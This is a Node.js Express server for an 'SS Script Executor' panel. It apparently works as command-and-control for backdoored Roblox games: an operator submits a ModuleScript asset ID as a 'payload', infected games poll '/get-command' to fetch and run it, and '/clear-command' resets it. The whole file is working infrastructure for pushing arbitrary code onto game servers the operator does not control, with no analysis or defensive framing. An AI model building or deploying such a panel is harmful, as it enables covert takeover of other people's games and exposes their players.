const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

let currentPayloadId = ""; 

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Allows parsing form submissions

// HOMEPAGE: This replaces "Cannot GET /" with a web interface
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SS Executor Panel</title>
            <style>
                body {
                    background-color: #121212;
                    color: #ffffff;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .panel {
                    background-color: #1e1e1e;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
                    text-align: center;
                    width: 350px;
                }
                h1 { color: #00ff7f; margin-bottom: 20px; font-size: 24px; }
                input[type="text"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    background-color: #2a2a2a;
                    border: 1px solid #444;
                    border-radius: 4px;
                    color: white;
                    box-sizing: border-box;
                }
                button {
                    background-color: #00ff7f;
                    color: #121212;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 4px;
                    font-weight: bold;
                    cursor: pointer;
                    width: 100%;
                    margin-top: 10px;
                }
                button:hover { background-color: #00cd66; }
                .status { margin-top: 15px; font-size: 14px; color: #aaa; }
            </style>
        </head>
        <body>
            <div class="panel">
                <h1>SS Script Executor</h1>
                <form action="/update-script-web" method="POST">
                    <input type="text" name="assetId" placeholder="Enter Roblox Module Asset ID" required />
                    <button type="submit">Deploy Asset ID</button>
                </form>
                <div class="status">Current Active ID: <strong>${currentPayloadId || "None"}</strong></div>
            </div>
        </body>
        </html>
    `);
});

// Endpoint for the web form submission
app.post('/update-script-web', (req, res) => {
    const { assetId } = req.body;
    if (!assetId || isNaN(assetId)) {
        return res.send("<script>alert('Invalid ID!'); window.location='/';</script>");
    }
    currentPayloadId = assetId;
    console.log(`[Panel] New script ID set via Web UI: ${currentPayloadId}`);
    res.send("<script>alert('Payload updated successfully!'); window.location='/';</script>");
});

// API endpoint for your web panel frontend or tools
app.post('/update-script', (req, res) => {
    const { assetId } = req.body;
    if (!assetId || isNaN(assetId)) {
        return res.status(400).json({ error: "Invalid Roblox ModuleScript Asset ID" });
    }
    currentPayloadId = assetId;
    console.log(`[Panel] New script ID set via API: ${currentPayloadId}`);
    res.json({ success: true, message: `Payload updated to ID: ${assetId}` });
});

// API endpoint that the Roblox game calls to fetch the latest command
app.get('/get-command', (req, res) => {
    res.json({ assetId: currentPayloadId });
});

// Clear the command once executed
app.post('/clear-command', (req, res) => {
    currentPayloadId = "";
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
